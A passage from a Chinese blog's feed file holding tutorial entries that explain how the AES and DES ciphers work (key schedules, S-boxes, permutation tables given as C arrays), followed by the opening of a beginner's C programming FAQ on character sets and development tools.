        <content type="html"><![CDATA[<h1 id="aes概述">AES概述</h1><p>AES(Advanced Encryption Standard)是一种<code>对称密钥</code>的<code>分组加密</code>算法.</p><p>不同于它的前任标准DES，Rijndael使用的是<a href="https://zh.wikipedia.org/wiki/%E4%BB%A3%E6%8D%A2-%E7%BD%AE%E6%8D%A2%E7%BD%91%E7%BB%9C">代换-置换网络</a>，而非<a href="https://zh.wikipedia.org/wiki/Feistel%E6%9E%B6%E6%9E%84">Feistel架构</a>.</p><p>AES分组固定为128bit,即16byte.而密钥长度可以为128bit,192bit或256bit.不同长度的密钥,推荐加密轮次也不同.</p><p>与DES不同,AES维护一个状态矩阵,所有加密轮次结束后,状态矩阵内容即为密文.</p><p>下面描述AES-128.</p><h1 id="aes基本结构">AES基本结构</h1><h2 id="加密轮次">加密轮次</h2><p>作为分组密码,AES的每个分组长度固定,而对于不同长度密钥,有着不同的推荐加密轮次(轮函数的执行次数),如下所示:</p><table><thead><tr><th style="text-align:center">AES</th><th style="text-align:center">密钥长度/字(32bit为1个字)</th><th style="text-align:center">分组长度/字(32bit为1个字)</th><th style="text-align:center">加密轮次</th></tr></thead><tbody><tr><td style="text-align:center">AES-128</td><td style="text-align:center">4</td><td style="text-align:center">4</td><td style="text-align:center">10</td></tr><tr><td style="text-align:center">AES-192</td><td style="text-align:center">6</td><td style="text-align:center">4</td><td style="text-align:center">12</td></tr><tr><td style="text-align:center">AES-256</td><td style="text-align:center">8</td><td style="text-align:center">4</td><td style="text-align:center">14</td></tr></tbody></table><h2 id="加密的结构">加密的结构</h2><p>AES在一个4x4的矩阵上运行,每个元素都是1byte,一共16byte,即一个128bit的分组.</p><p>初始时,这个矩阵内容即为当前分组的明文,填充进这个<code>状态矩阵</code>,顺序从上到下,从做到用,如下所示:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214152521877.png" alt="image-20231214152521877" style="zoom:50%;" /><p>每轮加密都是对这个状态矩阵进行几步运算,其中涉及到置换,异或,矩阵乘法等.</p><h2 id="密钥的处理">密钥的处理</h2><p>128位密钥也是以矩阵的形式来处理.需要对其进行扩展,最终扩展为44个字,其中前4个字位初始密钥,后40个字每10个一组依次用于10轮加密.</p><p>首先初始密钥也存储在一个4x4的矩阵:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214152734850.png" alt="image-20231214152734850" style="zoom:50%;" /><p>然后每一列的4个字节(byte)合成一个字(word):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214152908328.png" alt="image-20231214152908328" style="zoom:50%;" /><p>即<code>W0</code>为<code>K0K1K2K3</code>拼接而成.</p><p>接着根据如下规则产生后面的<code>W4</code>-<code>W43</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214153611764.png" alt="image-20231214153611764" style="zoom:50%;" /><ol><li>如果i不是4的倍数,则 <code>W[i] = W[i-4] xor W[i-1]</code></li><li>如果i是4的倍数,则 <code>W[i] = W[i-4] xor T(W[i-1])</code></li></ol><p>其中T()为:</p><p>a. 将4个字节进行<code>循环左旋</code>1个字节.</p><p>b. 然后使用<code>S盒</code>(AES定义的,后面给出)进行变换</p><p>c. 然后与<code>轮常量</code>Rcon[j]异或(图中的<code>j</code>为<code>i/4</code>):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214154248868.png" alt="image-20231214154248868" style="zoom:50%;" /></p><h2 id="aes的s盒和逆s盒">AES的S盒和逆S盒</h2><p>AES的S盒定义如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214160148556.png" alt="image-20231214160148556" style="zoom:50%;" /><p>逆S盒:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214160426437.png" alt="image-20231214160426437" style="zoom:50%;" /><p>查找时,将输入字节的高4位作为行,低4位作为列进行查找.</p><h2 id="行移位">行移位</h2><p>行移位是一个简单的左循环操作,第0行左移0位(即不移位),第1行左移1位,第2行左移2位,第3行左移3位.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214160647204.png" alt="image-20231214160647204" style="zoom:50%;" /><p>其逆变换即为反向的移位.</p><h2 id="列混合">列混合</h2><p>列混合是一个矩阵乘法,有一个固定的矩阵:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214160746412.png" alt="image-20231214160746412" style="zoom:50%;" /><p>逆列混合同理:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214160803810.png" alt="image-20231214160803810" style="zoom:50%;" /><p>可以验证两个矩阵<code>互逆</code>.</p><h2 id="轮密钥加">轮密钥加</h2><p>轮密钥加实际上就是<code>逐位异或</code>.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214160948716.png" alt="image-20231214160948716" style="zoom:50%;" /><h1 id="aes的加解密操作">AES的加解密操作</h1><p>过程如下图:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231214161107048.png" alt="image-20231214161107048" style="zoom:50%;" /><p>其中的<code>字节代换</code>就是查询S盒的操作,将一个字节输入S盒,输出结果就是查S盒表的结果.<code>逆字节代换</code>同理,使用逆S盒.</p><p>每一轮都使用扩展的对应的四字密钥.</p><p>另外,在第一轮迭代之前,先将明文和原始密钥进行一次异或加密操作.</p><br><p>参考:<a href="https://blog.csdn.net/qq_28205153/article/details/55798628">https://blog.csdn.net/qq_28205153/article/details/55798628</a></p>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DES</title>
      <link href="/2023f76861fd03aa/"/>
      <url>/2023f76861fd03aa/</url>
      
        <content type="html"><![CDATA[<h1 id="des概述">DES概述</h1><p>DES(Data Encryption Standard)是一种<code>对称密钥</code>的<code>分组加密</code>算法.</p><p>DES使用同一个长为64位(实际只有56位)的密钥进行加密和解密.</p><p>其分组为64位(8个字节),如果加密的数据不是64位的倍数,则按照某种规则进行填充.</p><p>到目前为止,DES已经不是一种安全的加密方法,主要因为它使用的56位密钥过短,现在已经逐渐被<code>AES</code>所取代.</p><br><p>DES算法将明文进行一系列的排列和替换来实现加密,关键过程为使用原始密钥来生成16个密钥,然后分别使用这16个密钥对数据依次进行一系列的位操作,一共进行16次,最终得到密文.解密相同,只不过反向(密钥使用顺序颠倒)进行操作.</p><h1 id="des加密流程">DES加密流程</h1><p>加密流程图(来自维基百科):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231213152749279.png" alt="image-20231213152749279" style="zoom:50%;" /><p>在核心加密之前需要执行一个<code>密钥调度</code>,即根据<code>原始密钥</code>生成16个48位的<code>子密钥</code>用于后续操作.</p><p>开始加密之前,先对明文进行一次置换,其中<code>IP</code>和<code>FP</code>为一对互逆的置换,即FP为IP的<code>反函数</code>.IP用于将明文<code>Plaintext</code>先进行一次换位处理,打乱原来的顺序,得到一个乱序的明文组,然后再进行核心的加密.</p><p>将64位明文组分成2部分,各为32位,并被交叉地分别处理,这种交叉结构被称为<code>费斯妥结构</code>,其保证了加密和解密过程足够相似,有利于电路/代码的实现.</p><p>接着就是<code>F函数</code>,这个函数即为DES的核心,使用生成好的48位<code>子密钥</code>对32位的数据进行操作,完成1次加密操作,一共有16次.</p><h2 id="初始置换ip">初始置换IP</h2><p>IP根据一个IP置换表进行换位:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231213011719278.png" alt="image-20231213011719278" style="zoom:50%;" /><p>也就是说,原来的64位明文为M0,置换后的明文为M1,</p><p>将M0的第58位换到M1的第1位,M0的第50位换到M1的第2位……以此类推.</p><p>置换完成后,将M1前后分成2块<code>L0</code>和<code>R0</code>,各为32位.</p><h2 id="密钥调度">密钥调度</h2><p>密钥调度即子密钥的生成.</p><p>DES根据初始的64位密钥来生成16个不同的子密钥,原来64位中有56位是有效位,其余8位(根据PC-1置换表)被用于<code>奇偶校验</code>,并最后被舍弃.</p><p>密钥调度流程图(来自维基百科):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231213152722041.png" alt="image-20231213152722041" style="zoom:50%;" /><h3 id="pc-1置换选取56位块">PC-1置换选取56位块</h3><p>首先将64位原始密钥使用<code>PC-1置换表</code>进行换位,并分成2组,该表只指定了56位,剩下的第8,16,24,32,40,48,56,64位共8位被舍弃.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PC-1置换表,因为无图所以用代码表示了</span></span><br><span class="line"><span class="type">int</span> pc1_l[<span class="number">28</span>] = &#123;</span><br><span class="line">    <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">    <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">    <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> pc1_r[<span class="number">28</span>] = &#123;</span><br><span class="line">    <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">    <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">    <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">    <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样就将64位原始密钥拆分成了2个28位的部分<code>C0</code>和<code>D0</code>.</p><h3 id="生成16个块ci-di-i-1-16">生成16个块Ci,Di(i=1-16)</h3><p>接下来根据公式</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>n</mi></msub><mo>=</mo><mi>r</mi><mi>o</mi><mi>t</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>C</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>r</mi><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>D</mi><mi>n</mi></msub><mo>=</mo><mi>r</mi><mi>o</mi><mi>t</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>D</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>r</mi><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C_n=rotate(C_0,r[n])\\D_n=rotate(D_0,r[n])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathdefault">n</span><span class="mclose">]</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathdefault">n</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span></span></p><p>进行<code>循环左旋</code>生成16个块Ci,Di(每个块都有一对Ci和Di)</p><p>其中左旋位数由<code>r[]</code>指定,<code>r[]</code>固定如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第0位无意义</span></span><br><span class="line"><span class="type">int</span> r[<span class="number">17</span>]=&#123;<span class="number">-1</span>,<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure><p>例如有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C0：<span class="number">1111000011001100101010101111</span></span><br><span class="line">D0：<span class="number">0101010101100110011110001111</span></span><br><span class="line"></span><br><span class="line">生成C1时,n=<span class="number">1</span>,则r[<span class="number">1</span>]==<span class="number">1</span>,循环左移<span class="number">1</span>位得:</span><br><span class="line"></span><br><span class="line">C1：<span class="number">1110000110011001010101011111</span></span><br><span class="line">D1：<span class="number">1010101011001100111100011110</span></span><br></pre></td></tr></table></figure><h3 id="生成16个子密钥k">生成16个子密钥K</h3><p>然后根据公式</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>n</mi></msub><mo>=</mo><mi>P</mi><msub><mi>C</mi><mn>2</mn></msub><mo stretchy="false">(</mo><msub><mi>C</mi><mi>n</mi></msub><msub><mi>D</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K_n = PC_2(C_nD_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>进行Ki(i=1-&gt;16)的生成,<code>CnDn</code>代表将Cn和Dn连接在一起.</p><p>其中PC2代表使用<code>PC-2置换表</code>进行换位,从<code>CiDi</code>中选取48位作为最终的密钥Ki.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PC-2置换表,因为无图所以用代码表示了</span></span><br><span class="line"><span class="type">int</span> pc2[<span class="number">48</span>] = &#123;</span><br><span class="line">            <span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line">            <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">            <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">            <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>,</span><br><span class="line">            <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">            <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>,</span><br><span class="line">            <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最终生成的16个48位比特串(块)Ki(i=1-16)即为16个子密钥,用于后续的加密.</p><h2 id="轮函数加密">轮函数加密</h2><p>流程仍然是这个图:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231213152749279.png" style="zoom:50%;" /><p>说白了就是在每一轮中将2块数据交替地进行<code>F()处理</code>,然后将处理后的值与本轮中另一个块进行异或.</p><h3 id="f函数">F函数</h3><p><img src="https://www.ruanx.net/content/images/2020/04/image-2.png" alt="img"></p><p>F函数将一个32bit的<code>(半)块</code>进行一次<code>E置换</code>,置换时进行了<code>扩张</code>,生成48bit的块,然后与48位的<code>子密钥K</code>进行<code>异或</code>,得到的48bit的结果再分成8组,每组为6bit,经过<code>S盒</code>,每组生成4bit的结果,组合起来一共为4*8==32bit的结果,然后再进行一次<code>P置换</code>,即为F函数的最终结果.</p><p>最终的结果仍然为32bit,与输入的32bit块大小一样,准备用于下一步加密.</p><h4 id="e置换">E置换</h4><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231213160234680.png" alt="image-20231213160234680" style="zoom:50%;" /><p>通过该表进行32bit -&gt; 48bit的扩张.</p><h4 id="异或">异或</h4><p>即将<code>E置换</code>后的48位扩张结果与子密钥K进行异或.</p><h4 id="s盒代换">S盒代换</h4><p>将异或结果分成6bit一组,共8组.经过S盒后,6位变为4位.</p><p>S盒代换有8个盒子(S-Box),分别对应8个组,通过查找表进行代换.</p><p>图片来源于<a href="https://www.cnblogs.com/idreamo/p/9333753.html">这篇文章</a>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1281268-20180721091109996-1317544123.png" alt="img" style="zoom: 80%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1281268-20180721091122027-316945059.png" alt="img" style="zoom:79%;" /><p>每一组查找到的数转为4位二进制数即为输出的4bit结果.</p><h4 id="p置换">P置换</h4><p>P为固定置换,将经过S盒变换得到的32bit进行一个置换操作.</p><p>需要注意一点:这个P置换是精心设计的,使得这一轮同一个S盒输出的四个bit,在下一回合的扩张之后,交由四个不同的S盒去处理.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// P置换表,因为无图所以用代码表示了</span></span><br><span class="line"><span class="type">int</span> P[<span class="number">32</span>]=&#123;</span><br><span class="line">    <span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">    <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,</span><br><span class="line">    <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">    <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>,</span><br><span class="line">    <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">    <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>,</span><br><span class="line">    <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="反函数置换fp">反函数置换FP</h2><p>FP和IP为反函数关系,轮函数后再进行一次<code>FP置换</code>得到最终结果.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231213162039600.png" alt="image-20231213162039600" style="zoom:50%;" /><p><code>IP逆</code>即为FP.</p><br><p>至此,即为整个加密,可以发现,使用同一个子密钥对一段数据进行两次轮函数(?)处理,得到的结果不变,这就体现出DES的加解密几乎一致.</p><h1 id="des解密">DES解密</h1><p>只需要将生成的16个子密钥逆转即可,即</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reverse_keys(SubKeys,<span class="number">16</span>); <span class="comment">// 自定义的函数,将16个子密钥反序</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-1_0-常见问题汇总</title>
      <link href="/202352962f72321d/"/>
      <url>/202352962f72321d/</url>
      
        <content type="html"><![CDATA[<p>ps:如果各位有遇到什么经典问题,欢迎在下面评论区@我,我会进行补充,谢谢~</p><h1 id="常识篇">常识篇</h1><p>指的是编程应该有的常识~</p><h2 id="字符分类">字符分类</h2><h3 id="字符">字符</h3><p>在计算机和电信技术中,一个字符是一个单位的字形、类字形单位或符号的基本信息.</p><p>一个字符可以是一个中文汉字、一个英文字母、一个阿拉伯数字、一个标点符号、一个图形符号或者控制符号等.</p><h3 id="字符集">字符集</h3><p>不同的字符集包含的字符个数不一样、包含的字符不一样、对字符的编码方式也不一样.</p><p>常见的字符集有:</p><ul><li><code>GB2312</code>:中国国家标准的简体中文字符集.</li><li>ASCII:只包含了128个字符,主要为英文字符,阿拉伯数字和一些简单的控制字符.</li><li>GBK字符集.在<code>GB2312</code>的基础上添加了部分字符,就形成了<code>GBK</code>,完全兼容<code>GB2312</code>.</li><li>Unicode字符集.国际标准字符集,可以容纳一百多万个字符.</li></ul><h3 id="ascii字符集">ASCII字符集</h3><p>C语言代码仅使用ASCII字符集构成(不考虑字符串).</p><p>分成<code>可见字符</code>和<code>不可见字符</code>,即一些控制字符和正常的英文字母,数字标点等可见字符.</p><p>其中<code>空格' '</code>,<code>制表符'\t'</code>,<code>换行符'\n'</code>,<code>回车符'\n'</code>,虽然为可见字符,但是是空白字符.</p><p>scanf()函数的<code>%s</code>格式控制符在遇到空白字符时会停止.</p><h1 id="软件篇">软件篇</h1><h2 id="概念的分辨">概念的分辨</h2><p>IDE，编译器，编辑器并不是一个东西，不要混淆……</p><p><code>IDE</code>：集成开发环境(Integrated Development Environment)，指一类集成的软件了，不仅仅可以进行代码的<code>编辑</code>，一般还默认集成了某种(或多种)<code>编译器</code>进行代码编译，还包括了<code>调试</code>功能，甚至还会有代码仓库的管理，协同开发等高级功能，一般较为庞大，不过也有<code>DevC++</code>这样的小型IDE。</p><p>常见的IDE有<code>Visual Studio(VS)</code>,<code>CLion</code>,<code>Devc++</code>,<code>Xcode</code>等等.他们有的是免费软件,但更多的是收费软件,具体见官方网址.</p><p><code>编译器</code>：即特定编程语言的编译工具，用于将源代码转为可执行代码，编译器几乎都是方便易用的，而且几乎都是免费的，安装即用。C/C++常用编译器有这三种种：<code>GCC(Linux下,windows移植于Mingw工具链)</code>，<code>Clang/LLVM</code>，<code>MSVC(微软家的编译器,VS系列IDE默认的编译器)</code>。</p><p><code>编辑器</code>：就跟windows下的记事本一样的，敲代码用的，只不过像<code>VScode</code>，<code>Sublimetext3</code>，<code>Notepad++</code>这样的高级编辑器十分强大，内置了许多高级的编辑功能，而且往往可以通过安装扩展来支持各种其他功能，往往能直接配置编译器进行代码的编译运行，所以甚至可以被改造为一款<code>IDE</code>。</p><h2 id="ide使用">IDE使用</h2><h3 id="vs配置c-c-环境并创建项目">VS配置C/C++环境并创建项目</h3><ol><li><p>Win7系统，建议使用VS2017，Win10及Win11使用VS2022</p></li><li><p>安装的时候只在<code>工作负荷</code>选一个<code>使用C++的桌面开发</code>即可，其他设置默认无需改动</p></li></ol><img 